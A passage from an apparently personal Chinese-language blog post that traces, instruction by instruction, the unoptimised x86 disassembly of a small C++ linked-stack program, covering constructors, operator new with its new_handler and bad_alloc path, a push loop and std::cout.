<p>可以猜测一下,主函数下面就开了一个局部的LinkedStack对象,var_10会不会是该对象呢</p>
<p>联系后面调用LinkedStack构造函数,<code>var_10</code>十有八九是该对象</p>
<h5 id="mov-ecx-eax"><code>mov     ecx, eax</code></h5>
<p>再转手交给ecx</p>
<h5
id="call-__zn11linkedstackc1ev"><code>call    __ZN11LinkedStackC1Ev</code></h5>
<p>调用LinkedStack类的构造函数</p>
<p>跟踪一下这个函数</p>
<h4
id="调用linkedstack实例化一个链栈对象">调用LinkedStack实例化一个链栈对象</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.text:00422334 ; Attributes: bp-based frame</span><br><span class="line">.text:00422334</span><br><span class="line">.text:00422334 ; LinkedStack *LinkedStack::LinkedStack(LinkedStack *__hidden this)</span><br><span class="line">.text:00422334 public __ZN11LinkedStackC1Ev</span><br><span class="line">.text:00422334 __ZN11LinkedStackC1Ev proc near</span><br><span class="line">.text:00422334</span><br><span class="line">.text:00422334 var_C= dword ptr -0Ch</span><br><span class="line">.text:00422334 var_4= dword ptr -4</span><br><span class="line">.text:00422334 this= dword ptr  8</span><br><span class="line">.text:00422334</span><br><span class="line">.text:00422334 push    ebp</span><br><span class="line">.text:00422335 mov     ebp, esp</span><br><span class="line">.text:00422337 push    ebx</span><br><span class="line">.text:00422338 sub     esp, 24h</span><br><span class="line">.text:0042233B mov     [ebp+var_C], ecx</span><br><span class="line">.text:0042233E mov     eax, [ebp+var_C]</span><br><span class="line">.text:00422341 mov     ecx, eax</span><br><span class="line">.text:00422343 call    __ZN5StackC2Ev  ; Stack::Stack(void)</span><br><span class="line">.text:00422348 mov     dword ptr [esp], 8 ; size_t</span><br><span class="line">.text:0042234F call    __Znwj          ; operator new(uint)</span><br><span class="line">.text:00422354 mov     ebx, eax</span><br><span class="line">.text:00422356 mov     dword ptr [esp+4], 0</span><br><span class="line">.text:0042235E mov     dword ptr [esp], 0</span><br><span class="line">.text:00422365 mov     ecx, ebx</span><br><span class="line">.text:00422367 call    __ZN10LinkedNodeC1EiPS_ ; LinkedNode::LinkedNode(int,LinkedNode*)</span><br><span class="line">.text:0042236C sub     esp, 8</span><br><span class="line">.text:0042236F mov     eax, [ebp+var_C]</span><br><span class="line">.text:00422372 mov     [eax+4], ebx</span><br><span class="line">.text:00422375 nop</span><br><span class="line">.text:00422376 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:00422379 leave</span><br><span class="line">.text:0042237A retn</span><br><span class="line">.text:0042237A __ZN11LinkedStackC1Ev endp</span><br></pre></td></tr></table></figure>
<p>ecx-&gt;var_C-&gt;eax-&gt;ecx,兜兜转转还是ecx,这就很乖,为啥要用var_C捯饬?</p>
<p>再看后面的<code>.text:00422343 call    __ZN5StackC2Ev  ; Stack::Stack(void)</code>恍然大悟</p>
<p>又要使用当前对象调用父类构造函数了,那么ecx中啃腚还是要存放当前对象</p>
<p>只不过编译器没有优化这件事了</p>
<p>跟踪一下父类构造函数Stack()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00422910 ; Attributes: bp-based frame</span><br><span class="line">.text:00422910</span><br><span class="line">.text:00422910 ; Stack *Stack::Stack(Stack *__hidden this)</span><br><span class="line">.text:00422910 public __ZN5StackC2Ev</span><br><span class="line">.text:00422910 __ZN5StackC2Ev proc near</span><br><span class="line">.text:00422910</span><br><span class="line">.text:00422910 var_4= dword ptr -4</span><br><span class="line">.text:00422910 this= dword ptr  8</span><br><span class="line">.text:00422910</span><br><span class="line">.text:00422910 push    ebp</span><br><span class="line">.text:00422911 mov     ebp, esp</span><br><span class="line">.text:00422913 sub     esp, 4</span><br><span class="line">.text:00422916 mov     [ebp+var_4], ecx</span><br><span class="line">.text:00422919 mov     eax, [ebp+var_4]</span><br><span class="line">.text:0042291C mov     dword ptr [eax], 0</span><br><span class="line">.text:00422922 nop</span><br><span class="line">.text:00422923 leave</span><br><span class="line">.text:00422924 retn</span><br><span class="line">.text:00422924 __ZN5StackC2Ev endp</span><br></pre></td></tr></table></figure>
<p>当前对象的栈中<strong>地址</strong>-&gt;ecx-&gt;var_4-&gt;eax</p>
<p>0-&gt;[eax]=当前对象=当前对象的第一个成员</p>
<p>也就是当前对象的第一个双字置0,而Stack对象的第一个成员正好是一个双字的<code>int len</code></p>
<p>因此这就做了<code>len = 0;</code>这么一件事</p>
<p>为啥要费六条汇编指令呢?这是调用约定固定的结构</p>
<p>ecx传递的当前对象的栈中地址必须先压入栈中然后eax从栈中获得该对象的地址,</p>
<p>后面使用eax寄存器相对寻址对栈上的对象进行内存读写</p>
<p>这样看直接从ecx交给eax不行吗?不需要压栈中转啊</p>
<p>显然是可以的,但是没有开启编译优化就得这样来</p>
<p><strong>回到LinkedStack()</strong></p>
<h5
id="mov-dword-ptr-esp-8-size_t"><code>mov     dword ptr [esp], 8 ; size_t</code></h5>
<p>栈顶上放一个8,貌似要调用函数了,但是很奇怪的是,后面要调用的是operator
new,它怎么会有参数呢?</p>
<p>还有就是,LinkedStack()构造函数中只有一个句柄head,没有一个int类型的局部变量,为啥现在要再栈上放一个8?</p>
<p><strong>联系后文可知,这个8将作为new开辟空间的大小Size</strong></p>
<p><strong>8临时占用了head句柄的位置,后面开出对象来之后再写回这个位置,节省了空间</strong></p>
<p>LinkedNode就两个成员变量并且都是4个字节,那么一个LinkedNode实例的大小也就是sizeof(LinkedNode)=8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> value;</span><br><span class="line">LinkedNode *next;</span><br></pre></td></tr></table></figure>
<p>因此这里把8临时放到head的位置</p>
<h5
id="call-__znwj-operator-newuint"><code>call    __Znwj          ; operator new(uint)</code></h5>
<p>调用new运算符(_Znwj这名字是真tm抽象)</p>
<p>根据源代码的逻辑,此处应该是new一个LinkedNode类实例作为链栈的附加头节点head</p>
<p>这个new干了啥呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726213033815.png"
alt="image-20220726213033815" />
<figcaption aria-hidden="true">image-20220726213033815</figcaption>
</figure>
<p>ebx是被调用者保存寄存器,也就是Znwj要维护其值前后不变</p>
<p>ebx压栈保存后被赋予新值1,然后申请了18h=24字节的栈帧空间</p>
<p><code>mov     eax, [esp+1Ch+arg_0]</code></p>
<p>这里esp=77fe50,arg_0=4</p>
<p>加起来指向77fe70,栈中这个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0077FE6C  00422354  LinkedStack::LinkedStack(void)+20</span><br><span class="line">0077FE70  00000008  </span><br></pre></td></tr></table></figure>
<p>这个位置是LinkedStack函数局部变量的起始位置</p>
<blockquote>
<p>也就是刚才<code>mov     dword ptr [esp], 8 ; size_t</code>这条指令的目的位置</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LinkedStack() : Stack()</span><br><span class="line">&#123;</span><br><span class="line">    head = new LinkedNode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而LinkedStack的局部变量只有一个head</p>
<p>那么这里eax将会是head这个句柄的值,刚才已经被临时置为8表征对象大小,因此现在用ebx保存这个大小,为head的真值让路</p>
<p>再往下到<code>log_4C7F12</code>中,</p>
<p>上来就把ebx放到栈上作为Size,准备调用malloc,而ebx经过前面的分析可以得知,就是LinkedNode的大小</p>
<p>这是循环的开始,可以看到循环调用了<code>_malloc</code>函数,推测是,如果堆上申请空间失败则一直重复申请,直到申请成功</p>
<p>怎么判断的?</p>
<p>malloc的返回值用eax承载,如果申请成功则eax承载的是堆上地址,否则eax=0</p>
<p>当eax不为0则<code>jz      short loc_4C7F23</code>跳转失败,执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:004C7F1E add     esp, 18h</span><br><span class="line">.text:004C7F21 pop     ebx</span><br><span class="line">.text:004C7F22 retn</span><br></pre></td></tr></table></figure>
<p>函数就返回了,eax承载返回值</p>
<p>当eax为0则<code>jz      short loc_4C7F23</code>后面继续循环</p>
<p>继续循环并没有立刻重新调用malloc函数,而是做了一些手续,具体干了啥呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726215953952.png"
alt="image-20220726215953952" />
<figcaption aria-hidden="true">image-20220726215953952</figcaption>
</figure>
<p>下到<code>loc_4C7F23</code>中,首先调用了一个无参函数<code>get_new_handler</code></p>
<p>这个函数就干了一个事<code>mov     eax, __ZN12_GLOBAL__N_113__new_handlerE ;</code>其中<code>__ZN12_GLOBAL__N_113__new_handlerE =0</code></p>
<p><code>new_handler</code>是我们应当人为设置的函数,即使用<code>set_new_handler</code>设置的函数,作用是在operator
new中,malloc开不出堆空间时,应该执行的函数</p>
<p>显然我们之前并没有使用set_new_handler设置这么一个纠错函数,这种情况下<code>get_new_handler</code>将返回NULL</p>
<p>显然<code>__ZN12_GLOBAL__N_113__new_handlerE</code>这个值应该存放的是一个函数地址,我们没有设置<code>set_new_handler</code>当然这个位置存放的是0,这也就是<code>get_new_handler</code>返回NULL的原因</p>
<p>说他是一个函数地址,还可以在后文看出,使用<code>get_new_handler</code>之后eax理论上承载的是函数地址,程序先检查一下eax是否有效,如果有效(即非零)则直接<code>call eax</code>说明eax中就是函数地址,即<code>__ZN12_GLOBAL__N_113__new_handlerE</code>理应存放函数地址</p>
<p>如果我们调用<code>set_new_handler</code>设置过处理函数,则直接跳转<code>loc_4C7F12</code>重新调用malloc</p>
<blockquote>
<p>这可以做一个实验</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;flag&#123;dustball&#125;&quot;</span>;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">10000000</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">set_new_handler</span>(flag);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="type">int</span> *p=<span class="keyword">new</span> <span class="type">int</span>[maxn];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果堆爆了,开不出来,理应执行flag函数,而主函数中我们丧心病狂地一直索取堆空间,必然会导致堆满</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\test&gt; g++ test.cpp -O0 -o test -m32</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\test&gt; ./test</span><br><span class="line">flag&#123;dustball&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到确实执行了<code>set_new_handler</code>设置的flag函数</p>
<p>如果把main中的死循环去掉,只索要一个1e7的int数组,显然不会爆堆,此时就不会执行flag函数</p>
<p>至于堆空间有多大呢?</p>
<p>这个在PE头-&gt;NT头-&gt;附加头-&gt;SizeOfHeapReserve</p>
<p>用010editor打开<code>main.exe</code>观察这个位置</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726222343978.png"
alt="image-20220726222343978" />
<figcaption aria-hidden="true">image-20220726222343978</figcaption>
</figure>
<p>发现给堆预留的空间是100000h=1MB</p>
</blockquote>
<p>如果我们没有设置过处理函数,则执行<code>loc_4C7F30</code>缺省处理过程.该处理过程干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:004C7F30</span><br><span class="line">.text:004C7F30 loc_4C7F30:             ; thrown_size</span><br><span class="line">.text:004C7F30 mov     [esp+1Ch+Size], 4</span><br><span class="line">.text:004C7F37 call    ___cxa_allocate_exception</span><br><span class="line">.text:004C7F3C mov     dword ptr [eax], offset off_4D8C80</span><br><span class="line">.text:004C7F42 mov     [esp+1Ch+var_14], offset __ZNSt9bad_allocD1Ev ; void (__cdecl *)(void *)</span><br><span class="line">.text:004C7F4A mov     [esp+1Ch+lptinfo], offset __ZTISt9bad_alloc ; lptinfo</span><br><span class="line">.text:004C7F52 mov     [esp+1Ch+Size], eax ; void *</span><br><span class="line">.text:004C7F55 call    ___cxa_throw</span><br><span class="line">.text:004C7F55 __Znwj endp</span><br></pre></td></tr></table></figure>
<p>这个结构并没有返回到loc_4C7F12重新尝试malloc,</p>
<p>一开始调用了<code>___cxa_allocate_exception</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726223944814.png"
alt="image-20220726223944814" />
<figcaption aria-hidden="true">image-20220726223944814</figcaption>
</figure>
<p>发生了什么事呢?先看结局,</p>
<p>要么左下GE,函数返回了,其效果就相当于<code>malloc</code>一开始就开出来然后返回了</p>
<p>要么右下BE,还是开不出来,直接调用了<code>terminate()</code>终止了程序</p>
<p>GE结局有两种达成情况,一个是<code>___cxa_allocate_exception</code>又尝试了一次malloc,这次开出来了,直接GE</p>
<p>另一种达成清空是,这次又没开出来,两次malloc都没开出来,这时候进入了<code>loc_4C805C</code>,关键调用了一个<code>__ZN12_GLOBAL__N_14pool8allocateEj_constprop_0</code></p>
<p>反汇编这个函数看看吧,好家伙都用到了互斥锁,涉及进程安全性了,上网搜一下<code>pool_allocate</code>吧,说是内存池之类的东西.</p>
<p>这就需要学了CSAPP实现<code>malloc</code>和<strong>STL源码剖析</strong>再说了</p>
<p>本次对<code>operator new</code>的炎鸠就到此位置吧</p>
<p>回到<code>LinkedStack()</code>函数中</p>
<h5 id="mov-ebx-eax"><code>mov     ebx, eax</code></h5>
<p>如果能回来,说明new没有寄,那么eax中就是new在堆上开辟的对象的地址</p>
<p>这里eax将堆上对象的地址交给了ebx</p>
<h5
id="mov-dword-ptr-esp4-0"><code>mov     dword ptr [esp+4], 0</code></h5>
<p>本条指令以及后面的<code>mov     dword ptr [esp], 0</code>参数压栈,马上要调用函数了</p>
<p><code>mov     ecx, ebx</code></p>
<p>ebx将堆上对象的地址交给ecx,</p>
<p>可是不应该放在栈上head的地方吗?为啥要给ecx呢?</p>
<p>之前我们已经知道,ecx是用来存放当前对象的,其作用也就是this指针</p>
<p>那么后面啃腚要调用一个作用于当前对象的函数</p>
<p>刚才我们从<code>new</code>的逻辑中只能看到分配了空间,可是这片对空间并没有初始化,而<code>head = new LinkedNode();</code>这里调用了构造函数.</p>
<p>那么可以推测,马上就要调用<code>LinkedNode</code>的构造函数了</p>
<h5
id="call-__zn10linkednodec1eips_-linkednodelinkednodeintlinkednode"><code>call    __ZN10LinkedNodeC1EiPS_ ; LinkedNode::LinkedNode(int,LinkedNode*)</code></h5>
<p>果然如此,调用了LinkedNode构造函数,他有两个参数,都是4字节类型</p>
<p>并且我们没有在源代码显式地给他传参,而是使用的缺省参数(默认为0)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head = new LinkedNode();</span><br></pre></td></tr></table></figure>
<p>这也就解释了刚才压栈两个0是为啥了</p>
<p>跟踪一下<code>LinkedNode()</code>干了啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:00421FE8 ; Attributes: bp-based frame</span><br><span class="line">.text:00421FE8</span><br><span class="line">.text:00421FE8 ; LinkedNode::LinkedNode(int, LinkedNode*)</span><br><span class="line">.text:00421FE8 public __ZN10LinkedNodeC1EiPS_</span><br><span class="line">.text:00421FE8 __ZN10LinkedNodeC1EiPS_ proc near</span><br><span class="line">.text:00421FE8</span><br><span class="line">.text:00421FE8 var_4= dword ptr -4</span><br><span class="line">.text:00421FE8 arg_0= dword ptr  8</span><br><span class="line">.text:00421FE8 arg_4= dword ptr  0Ch</span><br><span class="line">.text:00421FE8</span><br><span class="line">.text:00421FE8 push    ebp</span><br><span class="line">.text:00421FE9 mov     ebp, esp</span><br><span class="line">.text:00421FEB sub     esp, 4</span><br><span class="line">.text:00421FEE mov     [ebp+var_4], ecx</span><br><span class="line">.text:00421FF1 mov     eax, [ebp+var_4]</span><br><span class="line">.text:00421FF4 mov     edx, [ebp+arg_0]</span><br><span class="line">.text:00421FF7 mov     [eax], edx</span><br><span class="line">.text:00421FF9 mov     eax, [ebp+var_4]</span><br><span class="line">.text:00421FFC mov     edx, [ebp+arg_4]</span><br><span class="line">.text:00421FFF mov     [eax+4], edx</span><br><span class="line">.text:00422002 nop</span><br><span class="line">.text:00422003 leave</span><br><span class="line">.text:00422004 retn    8</span><br><span class="line">.text:00422004 __ZN10LinkedNodeC1EiPS_ endp</span><br></pre></td></tr></table></figure>
<p>esp-4在栈上申请了4字节空间,然后存放ecx中的对象地址,然后过继给eax</p>
<p>arg_0是左边第一个参数,经过edx中转放到[eax]上,这个寄存器寻址,也就是对象的起始位置,也就是<code>int value</code>的位置</p>
<p>arg_4,第二个参数,经过edx中转放到[eax+4],也就是对象起始地址偏上4个字节,即第二个成员<code>LinkedNode *next</code>的地址</p>
<p><code>retn 8</code>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add esp, 8h</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>即函数尾声</p>
<blockquote>
<p>函数的局部变量就一个当前对象地址的拷贝,4个字节,这里为啥要退栈8字节呢?</p>
<p>退栈之前的栈帧状态:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LinkedStack的栈帧</span><br><span class="line">...</span><br><span class="line">参数2</span><br><span class="line">参数1</span><br><span class="line">LinkedNode()的栈帧</span><br><span class="line">返回值地址&lt;-ebp</span><br><span class="line">局部变量</span><br></pre></td></tr></table></figure>
<p>退栈后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参数2</span><br><span class="line">参数1</span><br></pre></td></tr></table></figure>
<p>显然是合理的,调用者LinkedStack清理参数</p>
</blockquote>
<p>也就是说LinkedNode()将堆上LinkedNode对象两个成员都置零</p>
<p>回到LinkedStack中</p>
<h5 id="sub-esp-8"><code>sub     esp, 8</code></h5>
<p>又申请了8字节的空间</p>
<h5 id="eax-ebpvar_c"><code>eax, [ebp+var_C]</code></h5>
<p>var_C是存放的LinkedStack对象的堆地址</p>
<p>这里将它交给eax,看来是马上对他读写了</p>
<h5 id="eax4-ebx"><code>[eax+4], ebx</code></h5>
<p>ebx是LinkedNode对象的堆地址,[eax+4]寄存器相对寻址,解引用之后是<code>LinkedStack</code>对象的第二个成员,即<code>LinkedNode *head</code></p>
<p>这里就是将head句柄落实了,让他指向了堆上的一片空间</p>
<h5 id="mov-ebx-ebpvar_4"><code>mov     ebx, [ebp+var_4]</code></h5>
<p>var_4是函数开端时被调用者保存的上级函数的ebx值</p>
<p>见函数开端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00422334 push    ebp</span><br><span class="line">.text:00422335 mov     ebp, esp</span><br><span class="line">.text:00422337 push    ebx</span><br></pre></td></tr></table></figure>
<p>现在本函数进入尾声了,要归还上级函数的ebx寄存器了,于是从栈里把他弹出来</p>
<h5 id="leave"><code>leave</code></h5>
<p>栈顶指针退回到本函数的帧指针处,帧指针重新指向上级函数的帧底</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq esp, ebp    # 使 rsp 和 rbp 指向同一位置，即子栈帧的起始处</span><br><span class="line">popq ebp	#弹出开端时压栈保存的上级函数帧指针</span><br></pre></td></tr></table></figure>
<h5 id="retn"><code>retn</code></h5>
<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0h</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>函数返回了</p>
<h4 id="从linkedstack回到main">从LinkedStack()回到main()</h4>
<p>从LinkedStack回来时标绿的部分执行完毕</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727002010882.png"
alt="image-20220727002010882" />
<figcaption aria-hidden="true">image-20220727002010882</figcaption>
</figure>
<h5 id="loc_401557"><code>loc_401557</code></h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401557 loc_401557:</span><br><span class="line">.text:00401557 mov     eax, [ebp+var_14]</span><br><span class="line">.text:0040155A cmp     eax, 0Ah</span><br><span class="line">.text:0040155D jg      short loc_40157D</span><br></pre></td></tr></table></figure>
<p>这里做了一个判断<code>var_14</code>是否为10</p>
<p>如果var_14&gt;10则跳转<code>loc_40157D</code></p>
<p>也就是右侧</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727002224727.png"
alt="image-20220727002224727" />
<figcaption aria-hidden="true">image-20220727002224727</figcaption>
</figure>
<p>否则执行左侧循环</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727002247712.png"
alt="image-20220727002247712" />
<figcaption aria-hidden="true">image-20220727002247712</figcaption>
</figure>
<p>左侧循环体中,<code>var_14</code>每次+1,显然是作为循环变量用的</p>
<p>对应到源代码是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    sta.push(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里var_14就是i,判断条件就是10</p>
<h5 id="循环体">循环体</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0040155F lea     eax, [ebp+var_10]</span><br><span class="line">.text:00401562 lea     edx, [ebp+var_14]</span><br><span class="line">.text:00401565 mov     [esp], edx      ; this</span><br><span class="line">.text:00401568 mov     ecx, eax</span><br><span class="line">.text:0040156A call    __ZN11LinkedStack4pushERKi ; LinkedStack::push(int const&amp;)</span><br><span class="line">.text:0040156F sub     esp, 4</span><br><span class="line">.text:00401572 mov     eax, [ebp+var_14]</span><br><span class="line">.text:00401575 add     eax, 1</span><br><span class="line">.text:00401578 mov     [ebp+var_14], eax</span><br><span class="line">.text:0040157B jmp     short loc_401557</span><br></pre></td></tr></table></figure>
<p>var_10的地址放到eax中,var_10中存放的是什么,在调用LinkedStack()之前该值被作为唯一的参数传递给LinkedStack,显然是this指针,那么var_10存放的就是LinkedStack对象的首地址</p>
<p>var_14的地址放到edx中,var_14是循环变量,也是每次循环时将要被压入LinkedStack的值</p>
<p><code>mov     [esp], edx</code>将要压入LinkedStack的值先放到栈顶,作为参数传递</p>
<p><code>ecx, eax</code>用ecx承载LinkedStack对象地址,这是调用约定,马上就要调用成员函数了</p>
<p><code>call    __ZN11LinkedStack4pushERKi ; LinkedStack::push(int const&amp;)</code></p>
<p>该函数的唯一一个参数已经被刚才<code>mov     [esp], edx</code>放到栈顶了</p>
<p>该函数的细节就不需要步入跟踪了,放一张截图,反汇编写的已经很明白了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727003212521.png"
alt="image-20220727003212521" />
<figcaption aria-hidden="true">image-20220727003212521</figcaption>
</figure>
<h5 id="跳出循环体">跳出循环体</h5>
<p>当var_14也就是i=11,超过10的时候,跳出了循环</p>
<p>进入<code>loc_40157D</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727004848001.png"
alt="image-20220727004848001" />
<figcaption aria-hidden="true">image-20220727004848001</figcaption>
</figure>
<p>这里面大多数逻辑或者类似逻辑都已经炎鸠过了还差一个<code>cout&lt;&lt;</code>这个玩意儿</p>
<p>下面炎鸠一下这个怎么实现的</p>
<h5 id="stdcout">std::cout</h5>
<p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; sta.length() &lt;&lt; endl;</span><br></pre></td></tr></table></figure>
<p>反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0040157D lea     eax, [ebp+var_10]	;var_10,LinkedStack对象</span><br><span class="line">.text:00401580 mov     ecx, eax				;var_10经过eax中转放到ecx,为了遵守调用约定</span><br><span class="line">.text:00401582 call    __ZNK5Stack6lengthEv ; Stack::length(void)</span><br><span class="line">.text:00401587 mov     [esp], eax</span><br><span class="line">.text:0040158A mov     ecx, offset __ZSt4cout ; std::cout</span><br><span class="line">.text:0040158F call    __ZNSolsEi      ; std::ostream::operator&lt;&lt;(int)</span><br></pre></td></tr></table></figure>
<p>length函数的返回值放在eax中然后放到栈顶,准备参数</p>
<p>然后把<code>__ZSt4cout</code>的地址放到ecx中,显然作为对象传递</p>
<p>然后调用了__ZNSolsEi,即operator&lt;&lt;函数,打印了length</p>
<p>本函数执行之后,终端上已经打印出10了</p>
<p>可是后来貌似还打印了一些东西</p>
